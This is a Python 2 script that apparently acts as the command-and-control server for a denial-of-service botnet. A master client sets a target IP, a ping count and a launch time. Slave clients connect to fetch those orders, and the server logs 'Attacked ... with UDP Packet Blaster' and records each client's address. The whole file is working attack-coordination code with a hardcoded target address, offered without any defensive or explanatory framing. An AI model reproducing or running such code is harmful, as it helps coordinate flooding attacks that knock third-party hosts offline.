#!/usr/bin/python
from socket import *
import threading
import thread
import sys
import time
import datetime

master='master'
ping='slaveping'
punch="slavepunch"
slaveping='udp'
global ipAdd
global numPing
global ping_time
ipAdd ='198.252.11.70'
numPing = 5
ping_time = "2013-03-27-21-05-0"

def handler(clientsock,addr):
	while 1:
			global ipAdd
			global numPing
			global ping_time
			data = clientsock.recv(BUFSIZ)
				#		clientsock.send(msg)
			print >>sys.stderr, '\nReceived: "%s"' % data
			if data == master:
				ipAdd = clientsock.recv(BUFSIZ)
				print >>sys.stderr, 'New IP Address: "%s" ' % ipAdd
				#time.sleep(2)
				numPing = str(clientsock.recv(BUFSIZ))
				print >>sys.stderr, 'Number of Pings: "%s"' % numPing
				ping_time = clientsock.recv(BUFSIZ)
				clientsock.send('\n\nConfirmed IP Address: "%s" ' % ipAdd)
				clientsock.send('\nConfirmed Number of Pings: "%s" ' % numPing)
				clientsock.send('\nConfirmed Ping Time: "%s" ' % ping_time)
				break
			elif data == ping:
				clientsock.send(ipAdd)
				time.sleep(1)
				clientsock.send(str(numPing))
				time.sleep(1)
				clientsock.send(str(ping_time))
				print >>sys.stderr, 'Attacked %s with %s Pings' % (ipAdd, numPing)
				break
			elif data == punch:
				clientsock.send(ipAdd)
				print >>sys.stderr, 'Attacked %s with UDP Packet Blaster' % ipAdd
				break
			elif data == slaveping:
				clientsock.send(ipAdd)
				time.sleep(1)
				clientsock.send(str(numPing))
				time.sleep(1)
				clientsock.send(str(ping_time))
				print >>sys.stderr, 'Attacked %s with %s Pings' % (ipAdd, numPing)
				break
			else:
				print >>sys.stderr, 'Invalid Access From: ', clientsock
				break
	print '\nWaiting For Connections'
	clientsock.close()

if __name__=='__main__':
	#HOST = 'localhost'
	HOST = '198.252.11.72'  #USE THIS
	PORT = 35000
	BUFSIZ = 1024
	ADDR = (HOST, PORT)
	serversock = socket(AF_INET, SOCK_STREAM)
	print >>sys.stderr, 'Starting Up On: %s => Port: %s' % ADDR
	print 'Waiting For Connections'
	serversock.bind(ADDR)
	serversock.listen(2)

	while 1:
		clientsock, addr = serversock.accept()
		f=open('client_address_list','a')
		f.write(str(addr) + '\n')
		f.close()

		print '\nConnection From: ', addr
		thread.start_new_thread(handler, (clientsock, addr))
